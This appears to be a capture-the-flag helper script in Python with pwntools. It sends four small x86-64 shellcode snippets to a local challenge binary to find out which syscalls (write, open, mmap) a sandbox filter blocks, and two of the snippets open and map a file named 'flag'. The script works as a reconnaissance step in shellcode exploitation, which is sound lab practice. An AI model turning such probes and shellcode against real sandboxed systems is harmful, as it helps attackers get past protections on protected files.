#!/usr/bin/env python3
""" 逐步定位：测试 write / open / mmap 哪个被禁 """
from pwn import *
context.arch = 'amd64'

tests = {
    "write(1)": """
        mov eax,1; mov edi,1; lea rsi,[rip+msg]; mov edx,4
        syscall
        mov eax,60; xor edi,edi; syscall
        msg: .ascii "OK\\n"
    """,
    "open(2)": """
        mov eax,2; lea rdi,[rip+flag]; xor esi,esi; xor edx,edx
        syscall
        mov eax,1; mov edi,1; lea rsi,[rip+msg]; mov edx,4
        syscall
        mov eax,60; xor edi,edi; syscall
        msg: .ascii "OK\\n"; flag: .asciz "flag"
    """,
    "mmap_anon(9)": """
        xor eax,eax; mov al,9; xor edi,edi; mov esi,0x1000
        mov edx,3; mov r10d,0x22; mov r8d,-1; xor r9d,r9d
        syscall
        mov eax,1; mov edi,1; lea rsi,[rip+msg]; mov edx,4
        syscall
        mov eax,60; xor edi,edi; syscall
        msg: .ascii "OK\\n"
    """,
    "mmap_file(9)": """
        mov eax,2; lea rdi,[rip+flag]; xor esi,esi; xor edx,edx
        syscall
        mov r12,rax
        xor edi,edi; mov esi,0x100; mov edx,1
        mov r10d,1; mov r8,r12; xor r9d,r9d
        mov eax,9; syscall
        mov eax,1; mov edi,1; lea rsi,[rip+msg]; mov edx,4
        syscall
        mov eax,60; xor edi,edi; syscall
        msg: .ascii "OK\\n"; flag: .asciz "flag"
    """,
}

for name, code in tests.items():
    try:
        sc = asm(code)
        io = process('./shellcode')
        io.recvuntil(b"Send your shellcode:")
        io.send(sc)
        try:
            r = io.recvall(timeout=2)
            ok = b"OK" in r
        except:
            ok = False
        io.close()
    except Exception as e:
        ok = False
        r = str(e)
    print(f"  {'✅' if ok else '❌'} {name}")
